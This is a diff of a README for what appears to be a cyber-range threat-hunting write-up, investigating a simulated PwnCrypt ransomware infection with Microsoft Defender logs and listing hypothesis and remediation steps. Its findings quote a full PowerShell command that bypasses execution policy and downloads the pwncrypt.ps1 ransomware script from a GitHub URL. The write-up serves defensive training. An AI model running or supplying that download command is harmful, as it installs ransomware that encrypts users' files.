@@ -1,6 +1,9 @@
 # Zero-Day-Ransomware-PwnCrypt-Outbreak
+
+<img width="1536" height="1024" alt="image" src="https://github.com/user-attachments/assets/84b28057-5767-4402-adaa-68f7214615ca" />
+
 Scenario
-A new ransomware strain named PwnCrypt has been reported in the news, leveraging a PowerShell-based payload to encrypt files on infected systems. The payload, using AES-256 encryption, targets specific directories such as the C:\Users\Public\Desktop, encrypting files and prepending a .pwncrypt extension to the original extension. For example, hello.txt becomes hello.pwncrypt.txt after being targeted with the ransomware. The CISO is concerned with the new ransomware strain being spread to the corporate network and wishes to investigate.
+A new ransomware strain called PwnCrypt has emerged, using a PowerShell-based payload to encrypt files with AES-256 encryption and adding a .pwncrypt extension to targeted files. The CISO is worried about its potential spread to the corporate network and intends to investigate further.
 
 Data Collection
 Inspect DeviceFileEvents logs in MS Defender for .pwncrpyt string
@@ -30,7 +33,23 @@ DeviceNetworkEvents
 Findings
 - Confirmed command line run by "labuser" to callout to github and save file locally. "pwncrypt.ps1 to C:\programdata "powershell.exe  -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/pwncrypt.ps1 -OutFile C:\programdata\pwncrypt.ps1"
 
+Data Analysis
 
+Hypothothis
+- User "labuser," with admin permissions, ran command line code that downloaded PwnCrypt ransomware to the machine. Pwncrypt encoded files and demanded a bitcoin ransom.
+Evidence
+- Data finding of DeviceNetworkEvents and DeviceFileEvents above.
+
+Investigation
+
+- Analysis of the pwncrypt.ps1 file indicates code associated with ransom ware.
+
+Remediation
+
+- Isolate endpoints with pwncrypt.ps1 file and eradicate.
+- Kill any additional processing spawned.
+- Block traffic to/from assoicated URL
+- 
 
 
 
